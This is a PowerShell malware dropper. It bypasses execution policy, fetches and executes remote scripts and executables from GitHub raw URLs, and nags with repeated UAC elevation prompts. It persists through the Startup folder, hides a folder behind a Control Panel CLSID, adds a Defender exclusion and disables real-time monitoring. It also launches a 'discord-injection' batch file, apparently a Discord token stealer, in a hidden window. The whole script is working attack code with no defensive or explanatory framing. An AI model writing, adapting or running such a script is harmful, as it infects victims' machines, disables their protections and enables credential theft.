Set-ExecutionPolicy Bypass -Scope Process -Force
$skid = "skid"
iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $startup = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')

    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$startup\run.cmd"
    while(1) {
        try {
            Start-Process -Verb RunAs -FilePath '$startup\run.cmd';
            Remove-Item -Path "$startup\run.cmd"
            Stop-Process $pid -Force
        } catch {}
    }
}

iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -useb)

$rdir = "C:\Users\startup"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp



Add-MpPreference -ExclusionPath $dir
Set-MpPreference -DisableRealtimeMonitoring $true



Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/siuu.exe" -OutFile "$dir\remote.exe"

Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}


Invoke-WebRequest -Uri "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/assets/hookinjection.bat" -OutFile "$temp\injection.cmd"
Start-Process -FilePath "$temp\injection.cmd" -WindowStyle Hidden

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden


